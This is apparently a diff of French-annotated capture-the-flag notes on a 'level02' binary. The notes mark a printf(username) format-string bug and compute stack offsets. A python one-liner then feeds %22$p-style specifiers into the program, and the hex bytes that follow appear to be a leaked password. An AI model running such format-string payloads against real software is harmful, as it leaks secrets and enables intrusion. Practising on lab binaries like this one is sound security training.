@@ -41,11 +41,20 @@ int main(int argc, char **argv) {
 	if (strncmp(password, try, 41)) {
 		system("/bin/sh");
 	}
-	printf("fail");
+	printf(username);
+	puts(" does not have access!")
 	exit(1);
 }
 
+nb param reg 		= 5
+Password			= 0x7fffffffe530;
+premier para stack	= 0x7fffffffe4b0
 
+Diff				= 128 
+
+ce qui donne : 128 / 8 + 5 = 21 params et donc le debut du buffeur est au 22eme parametre
+
+ python -c "print '%22\$p.%23\$p.%24\$p.%25\$p.%26\$p' + '\n' + 'a' + '\n'" | /home/users/level02/level02
 
 75 6e 50 52 34 37 68 48
 45 41 4a 35 61 73 39 51
